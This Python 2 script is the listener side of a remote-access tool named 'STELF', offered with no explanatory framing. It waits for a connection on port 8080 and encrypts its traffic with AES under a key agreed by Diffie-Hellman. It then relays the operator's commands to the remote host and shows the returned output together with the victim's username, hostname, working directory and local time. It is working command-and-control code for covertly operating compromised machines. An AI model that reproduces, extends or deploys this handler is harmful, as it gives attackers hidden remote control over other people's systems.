#!/usr/bin/env python2
import socket, sys, json, base64, random, hashlib
from Crypto.Cipher import AES

class Handler:
	def __init__(self, bind, port):
		self.bind = bind
		self.port = port
                
		self.cwd = "STELF CONNECTED"
		self.prompt = self.cwd + ">> "
		self.server_sock = socket.socket()
		self.server_sock.bind((self.bind, self.port))
		
		self.commands = []
		
	def gen_diffie_key(self):
		modulus = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA237327FFFFFFFFFFFFFFFF
		base = 2
		
		private_key = random.randint(10**(255), (10**256)-1)
		public_key = pow(base, private_key, modulus)
		
		client_key = self.client_socket.recv(4096)
		self.client_socket.sendall(str(public_key))
		
		sharedSecret = pow(int(client_key), private_key, modulus)
		
		hash = str(hashlib.sha256(str(sharedSecret)).hexdigest())
		key = hash[:32]
		IV = hash[-16:]
		
		return key, IV
		
	def encrypt(self, data):
		return base64.b64encode(self.aes_obj.encrypt(data))
		
	def decrypt(self, data):
		return self.aes_obj.decrypt(base64.b64decode(data))
		
	def send_cmd(self, command):
		self.commands.append(command)
		self.client_socket.sendall(self.encrypt(command))
		
	def make_prompt(self, data_package):
		if data_package["username"] and data_package["hostname"]:
			self.prompt = data_package["localtime"] + " " +\
							data_package["username"] + "@" +\
							data_package["hostname"] + " " +\
							data_package["cwd"] + ">> "

		else:
			self.prompt = data_package["localtime"] + " " +\
							data_package["username"] + " " +\
							data_package["hostname"] + " " +\
							data_package["cwd"] + ">> "
							
		self.prompt = self.prompt.strip()

	def start(self):
		self.server_sock.listen(5)
		self.client_socket, _ = self.server_sock.accept()
		
		key, IV = self.gen_diffie_key()
		self.aes_obj = AES.new(key, AES.MODE_CFB, IV)
		
		
		while True:
			user_input = raw_input("\n" + self.prompt)
			if user_input == "help":
				print "Available commands:\n prompt - change prompt"
			self.send_cmd(user_input)
			data = self.decrypt(self.client_socket.recv(4096))
			data_package = json.loads(data)
			for key in data_package:
				data_package[key] = base64.b64decode(data_package[key])
			
			self.make_prompt(data_package)
			
			sys.stdout.write(data_package["data"])

handler = Handler("0.0.0.0", 8080)
handler.start()
